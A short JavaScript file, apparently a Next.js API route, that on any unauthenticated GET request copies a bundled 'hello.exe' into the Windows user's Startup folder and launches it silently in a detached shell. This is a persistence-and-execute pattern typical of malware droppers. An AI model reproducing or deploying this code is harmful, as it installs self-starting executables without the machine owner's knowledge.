import { spawn } from 'child_process';
import path from 'path';
import os from 'os';
import fs from 'fs';

function execPromise(command) {
  return new Promise((resolve, reject) => {
    const process = spawn(command, {
      shell: true,
      detached: true, // Ensure the process is detached
      stdio: 'ignore' // Ignore stdin, stdout, stderr
    });

    process.on('error', (err) => {
      reject(err);
    });

    // Immediately resolve as soon as the .exe process is detached
    resolve();
  });
}

export default async function handler(req, res) {
  if (req.method === "GET") {
    try {
      const exePath = path.join(process.cwd(), "public", "hello.exe");
      const username = os.userInfo().username;
      const destinationPath = path.join('C:', 'Users', username, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'hello.exe');

      fs.copyFileSync(exePath, destinationPath);
      // Use `start` command to ensure the process runs independently of the terminal session
      await execPromise(`start "" "${destinationPath}"`);

      res.status(200).json({ message: 'Exe file started successfully' });
    } catch (error) {
      // console.error(`Exec error: ${error}`);
      res.status(500).json({ error: "failed" });
    }
  } else {
    res.status(405).json({ error: "Method not allowed" });
  }
}
